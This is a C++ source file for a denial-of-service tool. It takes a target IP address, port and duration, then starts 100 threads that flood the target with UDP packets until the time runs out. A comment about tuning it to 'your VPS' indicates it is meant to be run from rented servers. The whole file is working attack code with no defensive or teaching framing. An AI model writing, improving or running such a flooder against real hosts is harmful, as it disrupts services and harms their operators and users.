#include <iostream>
#include <thread>
#include <vector>
#include <atomic>
#include <cstring>
#include <cstdlib>
#include <ctime>
#include <csignal>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sched.h>

#define PACKET_SIZE 15000
#define PAYLOAD_SIZE 20
#define DEFAULT_THREADS 100
#define THREAD_CPU_CORE 1  // Pin threads to CPU core (change based on your VPS)

std::atomic<bool> attack_running(true);

void generate_payload(char *buffer, size_t size) {
    // Use a consistent payload to reduce fluctuations
    memset(buffer, 'A', size);  // Simple fixed payload
    buffer[size] = '\0';
}

void udp_attack(const char *ip, int port, int attack_time) {
    struct sockaddr_in server_addr;
    int sock;
    char buffer[PAYLOAD_SIZE + 1];

    // Create socket for UDP communication
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        std::cerr << "Error: Could not create socket! Reason: " << strerror(errno) << std::endl;
        return;
    }

    // Set up server address structure
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
        std::cerr << "Error: Invalid IP address - " << ip << std::endl;
        close(sock);
        return;
    }

    // Pin thread to specific CPU core to reduce fluctuations
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(THREAD_CPU_CORE, &cpuset);
    if (pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset) != 0) {
        std::cerr << "Error: Failed to bind thread to CPU core." << std::endl;
    }

    time_t start_time = time(NULL);
    while (time(NULL) - start_time < attack_time) {
        generate_payload(buffer, PAYLOAD_SIZE);

        if (sendto(sock, buffer, PAYLOAD_SIZE, 0, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
            std::cerr << "Error sending packet: " << strerror(errno) << std::endl;
        }
    }

    close(sock);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        std::cout << "Usage: " << argv[0] << " <ip> <port> <time>" << std::endl;
        return 1;
    }

    const char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);

    std::cout << "Flood started to " << ip << ":" << port << " with " << DEFAULT_THREADS << " threads for " << duration << " seconds." << std::endl;

    // Perform attack using threads
    std::vector<std::thread> threads;
    for (int i = 0; i < DEFAULT_THREADS; i++) {
        threads.push_back(std::thread(udp_attack, ip, port, duration));
    }

    // Join all threads
    for (auto &t : threads) {
        t.join();
    }

    return 0;
}
